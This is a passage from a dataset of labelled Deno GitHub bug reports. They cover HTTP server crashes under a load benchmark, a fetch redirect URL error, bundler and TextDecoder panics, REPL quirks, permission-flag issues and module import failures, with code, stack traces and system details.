($deno$/testing.ts:68:11)\r\n2020-07-13T11:52:15.3487062Z     at TestRunner.[Symbol.asyncIterator] ($deno$/testing.ts:276:22)\r\n2020-07-13T11:52:15.3490019Z     at TestRunner.next (<anonymous>)\r\n2020-07-13T11:52:15.3490281Z     at runTests ($deno$/testing.ts:364:20)\r\n```\r\n\r\nI've seen this error pop up several times over past days. \r\n\r\nAlso @nayeemrmn pointed out that tests using max buffer size are very slow.\r\n\r\nCC @marcosc90 "},{"labels":["bug",null],"text":"Update: Instructions and example code also uploaded to https://github.com/trivikr/node-deno-http-benchmarks\r\n\r\n### System Information\r\n\r\n<details>\r\n<summary>Click to expand</summary>\r\n\r\n```console\r\n$ sw_vers                           \r\nProductName:\tMac OS X\r\nProductVersion:\t10.14.6\r\nBuildVersion:\t18G3020\r\n\r\n$ sysctl -n machdep.cpu.brand_string\r\nIntel(R) Core(TM) i7-5557U CPU @ 3.10GHz\r\n\r\n$ deno --version\r\ndeno 1.1.3\r\nv8 8.5.216\r\ntypescript 3.9.2\r\n\r\n$ node --version\r\nv14.5.0\r\n\r\n$ autocannon --version\r\nautocannon v5.0.1\r\nnode v14.5.0\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Deno v1.1.3\r\n\r\n<details>\r\n<summary>Code</summary>\r\n\r\n```ts\r\nimport { serve } from \"https://deno.land/std@0.60.0/http/server.ts\";\r\n\r\nconst port = 3000;\r\nconst s = serve({ port });\r\n\r\nconsole.log(\"deno_http listen on\", port);\r\nfor await (const req of s) {\r\n  req.respond({ body: \"Hello World\\n\" });\r\n}\r\n```\r\n\r\n</details>\r\n\r\n#### Output\r\n```console\r\n$ deno run --allow-net deno_http.ts &\r\n[1] 94340\r\n\r\n$ deno_http listen on 3000\r\n\r\n$ autocannon -c1000 localhost:3000\r\nRunning 10s test @ http://localhost:3000\r\n1000 connections\r\n\r\nrunning [                    ] 0%error: Uncaught Error: Too many open files (os error 24)\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:42:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:93:10)\r\n    at async ListenerImpl.accept ($deno$/net.ts:63:17)\r\n    at async Server.acceptConnAndIterateHttpRequests (https://deno.land/std@0.60.0/http/server.ts:185:20)\r\n    at async MuxAsyncIterator.callIteratorNext (https://deno.land/std@0.60.0/async/mux_async_iterator.ts:22:37)\r\n[1]  + exit 1     deno run --allow-net deno_http.ts\r\n┌─────────┬──────┬──────┬───────┬──────┬──────┬───────┬──────┐\r\n│ Stat    │ 2.5% │ 50%  │ 97.5% │ 99%  │ Avg  │ Stdev │ Max  │\r\n├─────────┼──────┼──────┼───────┼──────┼──────┼───────┼──────┤\r\n│ Latency │ 0 ms │ 0 ms │ 0 ms  │ 0 ms │ 0 ms │ 0 ms  │ 0 ms │\r\n└─────────┴──────┴──────┴───────┴──────┴──────┴───────┴──────┘\r\n┌───────────┬─────┬──────┬─────┬───────┬─────┬───────┬─────┐\r\n│ Stat      │ 1%  │ 2.5% │ 50% │ 97.5% │ Avg │ Stdev │ Min │\r\n├───────────┼─────┼──────┼─────┼───────┼─────┼───────┼─────┤\r\n│ Req/Sec   │ 0   │ 0    │ 0   │ 0     │ 0   │ 0     │ 0   │\r\n├───────────┼─────┼──────┼─────┼───────┼─────┼───────┼─────┤\r\n│ Bytes/Sec │ 0 B │ 0 B  │ 0 B │ 0 B   │ 0 B │ 0 B   │ 0 B │\r\n└───────────┴─────┴──────┴─────┴───────┴─────┴───────┴─────┘\r\n\r\nReq/Bytes counts sampled once per second.\r\n\r\n0 requests in 10.25s, 0 B read\r\n2k errors (206 timeouts)\r\n\r\n$ lsof -ti tcp:3000 | xargs kill \r\n```\r\n\r\n### Node.js v14.5.0\r\n\r\n<details>\r\n<summary>Code</summary>\r\n\r\n```js\r\nconst http = require(\"http\");\r\n\r\nconst hostname = \"127.0.0.1\";\r\nconst port = 3000;\r\n\r\nconst server = http.createServer((req, res) => {\r\n  res.end(\"Helloi World!\");\r\n});\r\n\r\nserver.listen(port, hostname, () => {\r\n  console.log(\"node listening on:\", port);\r\n});\r\n```\r\n\r\n</details>\r\n\r\n#### Output\r\n```console\r\n$ node node_http.js &\r\n[1] 94503\r\n\r\n$ node listening on: 3000\r\n\r\n$ autocannon -c1000 localhost:3000   \r\nRunning 10s test @ http://localhost:3000\r\n1000 connections\r\n\r\n┌─────────┬───────┬───────┬───────┬────────┬──────────┬──────────┬────────────┐\r\n│ Stat    │ 2.5%  │ 50%   │ 97.5% │ 99%    │ Avg      │ Stdev    │ Max        │\r\n├─────────┼───────┼───────┼───────┼────────┼──────────┼──────────┼────────────┤\r\n│ Latency │ 32 ms │ 49 ms │ 91 ms │ 169 ms │ 54.97 ms │ 48.72 ms │ 1087.64 ms │\r\n└─────────┴───────┴───────┴───────┴────────┴──────────┴──────────┴────────────┘\r\n┌───────────┬────────┬────────┬─────────┬─────────┬─────────┬────────┬────────┐\r\n│ Stat      │ 1%     │ 2.5%   │ 50%     │ 97.5%   │ Avg     │ Stdev  │ Min    │\r\n├───────────┼────────┼────────┼─────────┼─────────┼─────────┼────────┼────────┤\r\n│ Req/Sec   │ 4515   │ 4515   │ 19311   │ 21887   │ 18277.8 │ 4860   │ 4515   │\r\n├───────────┼────────┼────────┼─────────┼─────────┼─────────┼────────┼────────┤\r\n│ Bytes/Sec │ 510 kB │ 510 kB │ 2.18 MB │ 2.47 MB │ 2.07 MB │ 549 kB │ 510 kB │\r\n└───────────┴────────┴────────┴─────────┴─────────┴─────────┴────────┴────────┘\r\n\r\nReq/Bytes counts sampled once per second.\r\n\r\n183k requests in 10.38s, 20.7 MB read\r\n2 errors (0 timeouts)\r\n\r\n$ lsof -ti tcp:3000 | xargs kill \r\n```"},{"labels":["bug",null,null],"text":"When trying to fetch a [Wikipedia REST API](https://en.wikipedia.org/api/rest_v1/#/Page%20content/get_page_summary__title_), Deno will thrown error saying failed to connect, while the url displayed in the error message is not a valid URL. With further testing, it seems that the API will have some redirect behind.\r\n\r\n---\r\n\r\nSample failure code:\r\n```ts\r\nfetch(\"https://en.wikipedia.org/api/rest_v1/page/summary/computer\").then((res)=> {\r\n  res.json().then((data)=> {\r\n    console.log(data)\r\n  });\r\n});\r\n```\r\n\r\nError:\r\n```\r\nerror: Uncaught Http: error sending request for url (https://en.wikipedia.orgcomputer/): error trying to connect: dns error: failed to lookup address information: nodename nor servname provided, or not known\r\n```\r\n\r\n---\r\n\r\nSimilar code which the request is without redirect:\r\n```ts\r\nfetch(\"https://en.wikipedia.org/api/rest_v1/page/summary/Computer\").then((res)=> {\r\n  res.json().then((data)=> {\r\n    console.log(data)\r\n  });\r\n});\r\n```\r\n\r\nResponse: \r\n```json\r\n{\r\n  \"type\": \"standard\",\r\n  \"title\": \"Computer\",\r\n  \"displaytitle\": \"Computer\",\r\n  \"namespace\": {\r\n    \"id\": 0,\r\n    \"text\": \"\"\r\n  },\r\n  \"wikibase_item\": \"Q68\",\r\n  \"titles\": {\r\n    \"canonical\": \"Computer\",\r\n    \"normalized\": \"Computer\",\r\n    \"display\": \"Computer\"\r\n  },\r\n  \"pageid\": 7878457,\r\n  \"lang\": \"en\",\r\n  \"dir\": \"ltr\",\r\n  \"revision\": \"966740228\",\r\n  \"tid\": \"1d4a2fc0-c3cb-11ea-a890-c1085d3174ec\",\r\n  \"timestamp\": \"2020-07-08T22:21:37Z\",\r\n  \"description\": \"Automatic general-purpose device for performing arithmetic or logical operations\",\r\n  \"description_source\": \"local\",\r\n  \"content_urls\": {\r\n    \"desktop\": {\r\n      \"page\": \"https://en.wikipedia.org/wiki/Computer\",\r\n      \"revisions\": \"https://en.wikipedia.org/wiki/Computer?action=history\",\r\n      \"edit\": \"https://en.wikipedia.org/wiki/Computer?action=edit\",\r\n      \"talk\": \"https://en.wikipedia.org/wiki/Talk:Computer\"\r\n    },\r\n    \"mobile\": {\r\n      \"page\": \"https://en.m.wikipedia.org/wiki/Computer\",\r\n      \"revisions\": \"https://en.m.wikipedia.org/wiki/Special:History/Computer\",\r\n      \"edit\": \"https://en.m.wikipedia.org/wiki/Computer?action=edit\",\r\n      \"talk\": \"https://en.m.wikipedia.org/wiki/Talk:Computer\"\r\n    }\r\n  },\r\n  \"api_urls\": {\r\n    \"summary\": \"https://en.wikipedia.org/api/rest_v1/page/summary/Computer\",\r\n    \"metadata\": \"https://en.wikipedia.org/api/rest_v1/page/metadata/Computer\",\r\n    \"references\": \"https://en.wikipedia.org/api/rest_v1/page/references/Computer\",\r\n    \"media\": \"https://en.wikipedia.org/api/rest_v1/page/media/Computer\",\r\n    \"edit_html\": \"https://en.wikipedia.org/api/rest_v1/page/html/Computer\",\r\n    \"talk_page_html\": \"https://en.wikipedia.org/api/rest_v1/page/html/Talk:Computer\"\r\n  },\r\n  \"extract\": \"A computer is a machine that can be instructed to carry out sequences of arithmetic or logical operations automatically via computer programming. Modern computers have the ability to follow generalized sets of operations, called programs. These programs enable computers to perform an extremely wide range of tasks. A \\\"complete\\\" computer including the hardware, the operating system, and peripheral equipment required and used for \\\"full\\\" operation can be referred to as a computer system. This term may as well be used for a group of computers that are connected and work together, in particular a computer network or computer cluster.\",\r\n  \"extract_html\": \"<p>A <b>computer</b> is a machine that can be instructed to carry out sequences of arithmetic or logical operations automatically via computer programming. Modern computers have the ability to follow generalized sets of operations, called <i>programs.</i> These programs enable computers to perform an extremely wide range of tasks. A \\\"complete\\\" computer including the hardware, the operating system, and peripheral equipment required and used for \\\"full\\\" operation can be referred to as a <b>computer system</b>. This term may as well be used for a group of computers that are connected and work together, in particular a computer network or computer cluster.</p>\"\r\n}\r\n```\r\n"},{"labels":["bug",null],"text":"Thanks to make this awesome program. I like it!\r\nFollowed the issue #6516, I tried bundling some Deno scripts (which are importing React and ReactDOM from pikapkg) for browsers.\r\n\r\n>> In order to run your compiled TypeScript code in the browser, you're going to need a compiler for that purpose (like tsc with an appropriate tsconfig.json or webpack, etc.)\r\n> \r\n> Yes, you would likely get better results with other tools (tsc doesn't do any substantial bundling) but the compiler APIs (Deno.compile() and Deno.bundle()) are intended for this purpose as well, though they don't do minification or tree-shaking yet, which other tools do do.\r\n\r\n(Cited from #6516)\r\n\r\nHowever it threw an error. My code is as follows:\r\n\r\n```typescript\r\n// script.ts\r\n\r\nimport { assert } from \"https://deno.land/std/testing/asserts.ts\";\r\n\r\nconst [diagnostics, emit] = await Deno.bundle(\"/index.tsx\", {\r\n  \"/index.tsx\":\r\n    'import { React, ReactDOM } from \"./deps.ts\";\\n\\n//ReactDOM.render(<div></div>, document.getElementById(\"root\"));',\r\n  \"/deps.ts\":\r\n    '// @deno-types=\"https://deno.land/x/types/react-dom/v16.13.1/react.d.ts\"\\nexport * as React from \"https://cdn.pika.dev/@pika/react@^16.13.1\";\\n\\n// @deno-types=\"https://deno.land/x/types/react-dom/v16.13.1/react-dom.d.ts\"\\nexport * as ReactDOM from \"https://cdn.pika.dev/@pika/react-dom@^16.13.1\";',\r\n}, {\r\n  \"lib\": [\"DOM\", \"ES2019\"],\r\n});\r\n\r\nassert(diagnostics == null);\r\nconsole.log(emit);\r\n```\r\n\r\nThe error is:\r\n\r\n```sh\r\n$ RUST_BACKTRACE=full deno run --unstable ./script.ts\r\nthread 'main' panicked at 'Can't downcast ErrBox(JSError(JSError { message: \"Uncaught AssertionError: Assertion failed.\", source_line: None, script_resource_name: Some(\"$deno$/util.ts\"), line_number: Some(35), start_column: Some(10), end_column: Some(11), frames: [JSStackFrame { type_name: Some(\"Object\"), function_name: Some(\"assert\"), method_name: Some(\"assert\"), file_name: Some(\"$deno$/util.ts\"), line_number: Some(35), column_number: Some(11), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(11) }, JSStackFrame { type_name: None, function_name: Some(\"buildLocalSourceFileCache\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(613), column_number: Some(7), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(7) }, JSStackFrame { type_name: None, function_name: Some(\"runtimeBundle\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1566), column_number: Some(3), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(3) }, JSStackFrame { type_name: Some(\"global\"), function_name: Some(\"tsCompilerOnMessage\"), method_name: Some(\"onmessage\"), file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1671), column_number: Some(22), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(22) }, JSStackFrame { type_name: None, function_name: Some(\"workerMessageRecvCallback\"), method_name: None, file_name: Some(\"$deno$/runtime_worker.ts\"), line_number: Some(72), column_number: Some(33), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(33) }, JSStackFrame { type_name: Some(\"global\"), function_name: None, method_name: None, file_name: Some(\"file:///Users/user/__anonymous__\"), line_number: Some(1), column_number: Some(1), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(1) }], formatted_frames: [\"Object.assert ($deno$/util.ts:35:11)\", \"buildLocalSourceFileCache ($deno$/compiler.ts:613:7)\", \"runtimeBundle ($deno$/compiler.ts:1566:3)\", \"tsCompilerOnMessage ($deno$/compiler.ts:1671:22)\", \"workerMessageRecvCallback ($deno$/runtime_worker.ts:72:33)\", \"file:///Users/user/__anonymous__:1:1\"] })) to OpError', cli/op_error.rs:422:9\r\nstack backtrace:\r\n   0:        0x10edbf40c - <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::h9310af08f3ce84da\r\n   1:        0x10ede1d2e - core::fmt::write::hc0aa14019faca134\r\n   2:        0x10edb7539 - std::io::Write::write_fmt::hd2830ca3f2078082\r\n   3:        0x10edaa8ca - std::panicking::default_hook::{{closure}}::h4023b6274db11628\r\n   4:        0x10edaa5ce - std::panicking::default_hook::h971f7dd24c691011\r\n   5:        0x10edaae98 - std::panicking::rust_panic_with_hook::h88bf667ded98271c\r\n   6:        0x10edaaa62 - rust_begin_unwind\r\n   7:        0x10ee0b78b - std::panicking::begin_panic_fmt::habfc599ea530fe44\r\n   8:        0x10d85cf92 - <deno::op_error::OpError as core::convert::From<deno_core::errors::ErrBox>>::from::{{closure}}::h00b9773a3c9a4f17\r\n   9:        0x10d85cdae - <deno::op_error::OpError as core::convert::From<deno_core::errors::ErrBox>>::from::hde5f689c036fe73d\r\n  10:        0x10d75bed1 - <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll::h44456f0347b00ae4\r\n  11:        0x10d7528db - <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll::h0ec0422f52beebbf\r\n  12:        0x10d965861 - <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::h25537d086b51664c\r\n  13:        0x10d92a30d - <futures_util::future::future::flatten::Flatten<Fut,<Fut as core::future::future::Future>::Output> as core::future::future::Future>::poll::h0a495f33b830121b\r\n  14:        0x10d965c43 - <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::h06ff4a3592e47a0b\r\n  15:        0x10e1b1709 - <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::he87ef8983da1cd87\r\n  16:        0x10e1c3e3e - <futures_util::future::future::Map<Fut,F> as core::future::future::Future>::poll::hd60e4fa239aba502\r\n  17:        0x10e1ba245 - futures_util::stream::stream::StreamExt::poll_next_unpin::h6d3821f24b1794e8\r\n  18:        0x10e1c0ca9 - <deno_core::core_isolate::CoreIsolate as core::future::future::Future>::poll::h621b3c4b9bbbfe1e\r\n  19:        0x10e1b7ee8 - <deno_core::es_isolate::EsIsolate as core::future::future::Future>::poll::h9f621365840c118c\r\n  20:        0x10d77bcff - <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll::hba1981f32cfc80c1\r\n  21:        0x10d71c412 - std::thread::local::LocalKey<T>::with::hab4c18cf5ec3e7b7\r\n  22:        0x10d7a8f07 - tokio::macros::scoped_tls::ScopedKey<T>::set::h0f766d35df2a1ceb\r\n  23:        0x10d84a6a2 - tokio::runtime::context::enter::h926b2c73a63ce025\r\n  24:        0x10d8fa576 - deno::tokio_util::run_basic::hf89826a492699a00\r\n  25:        0x10d86dd31 - deno::main::h2662055f97167e28\r\n  26:        0x10d9af9d6 - std::rt::lang_start::{{closure}}::he12ba553872a314c\r\n  27:        0x10edab19c - std::rt::lang_start_internal::h1c4c0818546e8ffd\r\n  28:        0x10d870fc9 - main\r\n```\r\n\r\nIt did not throw any command line errors while I am trying to command `deno bundle --unstable -c ./tsconfig.json ./index.tsx` instead of using Deno.bundle() API, but this did not produce expected bundled code too, throwing the same error message in browsers like #6516.\r\n\r\nHow could I bundle it for browsers as expected?\r\nI am using macOS 10.15.5 and Deno 1.1.3. Thanks in advance."},{"labels":["bug",null,null],"text":"If any code uses shorthand notation:\r\n```ts\r\nimport { serve } from \"https://deno.land/std/http/server.ts\"\r\nconst PORT = 8080\r\nserve(`:${PORT}`)\r\n```\r\nthen any variant of \r\n```\r\ndeno run --allow-net=:8080 server.ts\r\ndeno run --allow-net=localhost:8080 server.ts\r\ndeno run --allow-net=0.0.0.0:8080 server.ts\r\ndeno run --allow-net=127.0.0.1:8080 server.ts\r\n```\r\nfails.\r\n\r\nUnfortunately, a lot of libraries in x use this pattern which makes locking down permissions impossible without forking all those libraries."},{"labels":["bug",null],"text":"This is the example from the website, with 2 modifications:\r\n\r\n 1. `s.close()` is scheduled after 5 seconds\r\n 2. The response body is a slow `Reader`\r\n\r\n```\r\nimport { serve } from \"https://deno.land/std@0.60.0/http/server.ts\";\r\nconst s = serve({ port: 8000 });\r\nconsole.log(\"http://localhost:8000/\");\r\nsetTimeout(() => { s.close() }, 5000)\r\nfor await (const req of s) {\r\n  req.respond({ body: {\r\n    // Drips an 'x' every second\r\n    async read(p: Uint8Array): Promise<number | null> {\r\n        await new Promise(resolve => setTimeout(resolve, 1000))\r\n        p.set([120])\r\n        return 1\r\n    }\r\n  } });\r\n}\r\n```\r\n\r\nAssuming you make an HTTP request in the first 5s, the connection will be closed immediately after close is called, but the loop will \"notice\" this a decade later, when the buffer fills and a write fails.\r\n\r\nI _think_ `Server` should be tracking `ServerRequests`, not only their `Conn`'s, and on `server.close()` also fulfill `req.done` with a \"server closed\" error."},{"labels":["bug",null],"text":"Just playing with the repl I tried to set a variable but glitched it, and found the variable became permanently inaccessible if not initialized when declared properly.\r\n\r\nSo first we have a variable with a text string in it not really important.\r\nNext I mistakenly noobed as I hoped to call TextEncoder without 'new', being in the REPL and all.\r\n\r\nthe target variable name becomes inaccessible and undeleteable at that point.\r\n\r\n```\r\n> let txt = \"File Contents here!\"\r\nundefined\r\n**> let dta = TextEncoder().encode(txt)**\r\nUncaught TypeError: Class constructor TextEncoder cannot be invoked without 'new'\r\n    at <unknown>:3:11\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n**> let dta**\r\nUncaught SyntaxError: Invalid or unexpected token\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n**> let dta = \"data\"**\r\nUncaught SyntaxError: Identifier 'dta' has already been declared\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n**> dta = \"data\"**\r\nUncaught ReferenceError: Cannot access 'dta' before initialization\r\n    at <unknown>:3:5\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n> delete dta\r\nUncaught SyntaxError: Delete of an unqualified identifier in strict mode.\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n> dta = undefined\r\nUncaught ReferenceError: Cannot access 'dta' before initialization\r\n    at <unknown>:3:5\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n**> dta = null**\r\nUncaught ReferenceError: Cannot access 'dta' before initialization\r\n    at <unknown>:3:5\r\n    at evaluate ($deno$/repl.ts:54:34)\r\n    at Object.replLoop ($deno$/repl.ts:156:13)\r\n\r\n```\r\n"},{"labels":["bug",null],"text":"When decoding a big buffer Deno crashes.\r\n\r\n```\r\nnew TextDecoder().decode(new Uint8Array(2 ** 29))\r\n```\r\n\r\n```\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', core/bindings.rs:677:5\r\nstack backtrace:\r\n   0: backtrace::backtrace::libunwind::trace\r\n             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/libunwind.rs:86\r\n   1: backtrace::backtrace::trace_unsynchronized\r\n             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/mod.rs:66\r\n   2: std::sys_common::backtrace::_print_fmt\r\n             at src/libstd/sys_common/backtrace.rs:78\r\n   3: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n             at src/libstd/sys_common/backtrace.rs:59\r\n   4: core::fmt::write\r\n             at src/libcore/fmt/mod.rs:1069\r\n   5: std::io::Write::write_fmt\r\n             at src/libstd/io/mod.rs:1504\r\n   6: std::sys_common::backtrace::_print\r\n             at src/libstd/sys_common/backtrace.rs:62\r\n   7: std::sys_common::backtrace::print\r\n             at src/libstd/sys_common/backtrace.rs:49\r\n   8: std::panicking::default_hook::{{closure}}\r\n             at src/libstd/panicking.rs:198\r\n   9: std::panicking::default_hook\r\n             at src/libstd/panicking.rs:218\r\n  10: std::panicking::rust_panic_with_hook\r\n             at src/libstd/panicking.rs:511\r\n  11: rust_begin_unwind\r\n             at src/libstd/panicking.rs:419\r\n  12: core::panicking::panic_fmt\r\n             at src/libcore/panicking.rs:111\r\n  13: core::panicking::panic\r\n             at src/libcore/panicking.rs:54\r\n  14: deno_core::bindings::decode\r\n  15: <extern \"C\" fn(A0) .> R as rusty_v8::support::CFnFrom<F>>::mapping::c_fn\r\n  16: _ZN2v88internal25FunctionCallbackArguments4CallENS0_15CallHandlerInfoE\r\n             at ../../../../v8/src/api/api-arguments-inl.h:158\r\n  17: _ZN2v88internal12_GLOBAL__N_119HandleApiCallHelperILb0EEENS0_11MaybeHandleINS0_6ObjectEEEPNS0_7IsolateENS0_6HandleINS0_10HeapObjectEEESA_NS8_INS0_20FunctionTemplateInfoEEENS8_IS4_EENS0_16BuiltinArgumentsE\r\n             at ../../../../v8/src/builtins/builtins-api.cc:111\r\n  18: _ZN2v88internalL26Builtin_Impl_HandleApiCallENS0_16BuiltinArgumentsEPNS0_7IsolateE\r\n             at ../../../../v8/src/builtins/builtins-api.cc:141\r\n  19: Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\nfatal runtime error: failed to initiate panic, error 5\r\nAborted (core dumped\r\n```\r\n\r\nThe snippet returns `\"\"` on Chrome\r\n\r\n---\r\nDeno version: `1.1.3`\r\n\r\n\r\n"},{"labels":["bug",null,null],"text":"OS is Ubuntu 20.04\r\n```\r\ncat /etc/os-release\r\nNAME=\"Ubuntu\"\r\nVERSION=\"20.04 LTS (Focal Fossa)\"\r\nID=ubuntu\r\nID_LIKE=debian\r\nPRETTY_NAME=\"Ubuntu 20.04 LTS\"\r\nVERSION_ID=\"20.04\"\r\n```\r\n**Each time when inputing something in CLI, I got a msg \"WARN RS - rustyline:718 - cannot read initial cursor location\".**\r\n```\r\n$ deno\r\nDeno 1.1.3\r\nexit using ctrl+d or close()\r\nWARN RS - rustyline:718 - cannot read initial cursor location\r\n> \"hello\"\r\nhello\r\nWARN RS - rustyline:718 - cannot read initial cursor location\r\n> \"world\"\r\nworld\r\nWARN RS - rustyline:718 - cannot read initial cursor location\r\n>\r\n```\r\nSource code for that warning:\r\n```rust\r\nFrom \"https://github.com/kkawakam/rustyline/blob/master/src/tty/unix.rs\"\r\n\r\n    fn move_cursor_at_leftmost(&mut self, rdr: &mut PosixRawReader) -> Result<()> {\r\n        if rdr.poll(0)? != 0 {\r\n            debug!(target: \"rustyline\", \"cannot request cursor location\");\r\n            return Ok(());\r\n        }\r\n        /* Report cursor location */\r\n        self.write_and_flush(b\"\\x1b[6n\")?;\r\n        /* Read the response: ESC [ rows ; cols R */\r\n        if rdr.poll(100)? == 0\r\n            || rdr.next_char()? != '\\x1b'\r\n            || rdr.next_char()? != '['\r\n            || read_digits_until(rdr, ';')?.is_none()\r\n        {\r\n            warn!(target: \"rustyline\", \"cannot read initial cursor location\");\r\n            return Ok(());\r\n        }\r\n        let col = read_digits_until(rdr, 'R')?;\r\n        debug!(target: \"rustyline\", \"initial cursor location: {:?}\", col);\r\n        if col.is_some() && col != Some(1) {\r\n            self.write_and_flush(b\"\\n\")?;\r\n        }\r\n        Ok(())\r\n    }\r\n```\r\nDon't know how this comes up but I always get that warning on my own server. OS was upgraded from 18.04 to 20.04 online.\r\nHowever, on another machine with newly installed Ubuntu 20.04, this problem nerver happens. Can't reproduce it on the second machine.\r\n\r\n**Not familiar with Rust, what I want to know is:**\r\n- **1. Possible causes of that warning \"WARN RS - rustyline:718 - cannot read initial cursor location\".**\r\n- **2. How could I solve that?**\r\n\r\nThanks for any useful help! :D"},{"labels":["bug",null],"text":"When I try to do a deno test, the tests do not run and this message appears:\r\n\r\nthread 'main' panicked at 'called after complete', D:\\a\\deno\\deno/.cargo_home\\registry\\src\\github.com-1ecc6299db9ec823\\tokio-0.2.21\\src\\sync\\oneshot.rs:523:13\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace"},{"labels":["bug",null],"text":"OS: Ubuntu 20.04 LTS\r\n\r\nRelated issues: \r\n\r\nDenjucks: https://github.com/denjucks/denjucks/issues/9\r\nView-engine: https://github.com/deligenius/view-engine/issues/11\r\n\r\n### Code1 **denjucks**:\r\n\r\n```ts\r\n// @deno-types=\"https://deno.land/x/denjucks/mod.d.ts\"\r\nimport denjucks from \"https://deno.land/x/denjucks/mod.js\";\r\n\r\nconsole.log(\r\n    denjucks.renderString(\"hello {{ txt }}\", {txt: \"world\"})\r\n);\r\n```\r\n\r\n### Code2 **view-engine**:\r\n\r\n```ts\r\n// /app.ts\r\nimport { Application } from \"https://deno.land/x/oak/mod.ts\";\r\nimport {\r\n  viewEngine,\r\n  engineFactory,\r\n  adapterFactory,\r\n} from \"https://deno.land/x/view_engine/mod.ts\";\r\n\r\nconst ejsEngine = engineFactory.getEjsEngine();\r\nconst oakAdapter = adapterFactory.getOakAdapter();\r\n\r\nconst app = new Application();\r\n\r\napp.use(viewEngine(oakAdapter, ejsEngine));\r\n\r\napp.use(async (ctx, next) => {\r\n  ctx.render(\"index.ejs\", { data: { name: \"John\" } });\r\n});\r\n\r\nawait app.listen({ port: 8000 });\r\n```\r\n\r\n```html\r\n<!--./index.ejs-->\r\n<body>\r\n  <h1><%=data.name%></h1>\r\n</body>\r\n```\r\n### Error\r\n\r\nBoth Code1 and Code2 have the same error:\r\n```bash\r\nerror: Failed to get compiled source code of https://deno.land/std@0.59.0/path/mod.ts.\r\nReason: No such file or directory (os error 2)\r\n```\r\n\r\n### Observation\r\n\r\ndenjucks is written in JS, and view-engine includes a port version of ejs, which is also written in JS. As the error is related to the import of `path` module, so I've checked the source code of denjucks and view-engine. However, **all the `path` imports are being used by JS files.**\r\n\r\nHere is where I found all the `path` imports:\r\n\r\n\r\n#### Denjucks case\r\n\r\nthe import includes `path`:\r\n\r\n- https://deno.land/x/denjucks/src/deps.js#L1\r\n\r\nis being used by \r\n- https://deno.land/x/denjucks/src/environment.js#L3\r\n- https://deno.land/x/denjucks/src/environment.js#L3\r\n- ... and more\r\n\r\n#### View-engine case\r\n\r\nthe import includes `path`:\r\n\r\n- https://deno.land/x/view_engine/deps.ts#L5\r\n\r\nis being used by \r\n- https://deno.land/x/view_engine/lib/engines/ejs/ejs.js#L47\r\n\r\n\r\n### Conclusion\r\n\r\n- Deno fails to find files when import ts in js files.\r\n- Only happens in Ubuntu (test passed in Windows 10 and macOS)\r\n\r\n"},{"labels":["bug",null,null],"text":"**Note**: This is a really strange bug, so I would like to ask you for patience while reading it.\r\n\r\n\r\n**[Details]**\r\nFirst, I would like you to see this video because it will be hard to explain with only words: \r\n[Click here to see video](https://drive.google.com/file/d/11Z7_4z1KMzwYc55qCp41zOev8zjx7Ko7/view?usp=sharing)\r\n**I have attached this video in .ZIP format at the end of the issue if you do not feel comfortable with google drive**\r\n\r\n--\r\nWhat you saw in this video is that a class with **no imports whatsoever** (I say this because _at first_ I thought imports were making the HTTP dispatcher fail) is making the http dispatcher fail.\r\nIt's been happening to **new classes** on my code no matter whether it has imports or no as you saw in the video.  I have spent more than a day to find the root of the problem in order to be able to record this video.\r\nI can create any class in any folder, and it will make the http dispatcher fail, no matter what the content of the class is.\r\nIt is also happening to both static and non-static methods, it is also happening to classes without methods. so if I only import the class and as soon as I call it like this `MyClass;` (**so no effect at all on the code**), it will make the HTTP dispatcher fail.\r\n\r\n**Update**: It is happening not only with JS classes, but also empty defaults (```export default {}```) & functions (```export function MyFunction() {}```), with any class name, with any method name...\r\n  \r\n**[Context]**\r\nIt is impossible for me to provide a small context or reproducible context because I do not even know what the context is. It happens randomly to new classes, one class may cause the HTTP dispatcher fail, but another class may work just fine. When finding the causes and playing around with the code, I moved the class you saw in the video to a folder inside a folder inside a folder, and it worked fine, then I got the class out of the folder, and it started failing again: I say 